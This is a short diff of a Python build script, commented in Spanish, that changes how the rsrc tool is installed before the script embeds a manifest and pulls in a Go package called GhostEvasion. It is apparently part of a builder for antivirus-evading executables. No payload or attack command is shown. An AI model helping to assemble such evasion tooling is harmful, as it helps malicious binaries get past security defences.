@@ -46,7 +46,11 @@ with open(manifiesto_path, 'w', encoding='utf-8') as manifiesto_file:
     manifiesto_file.writelines(lineas)
 
 print(f"{colorama.Fore.BLACK}[*] Encryptando en archivo ejecutable.. ")
-os.system("go get github.com/akavel/rsrc")
+rsrc = shutil.which("rsrc")
+if rsrc is not None:
+    time.sleep(1.5)
+else:
+    os.system("go install github.com/akavel/rsrc@latest")
 os.system("rsrc -manifest .\manifiesto.txt")
 os.system("go mod init main")
 os.system("go get github.com/BlackShell256/GhostEvasion/pkg/GhostEvasion")
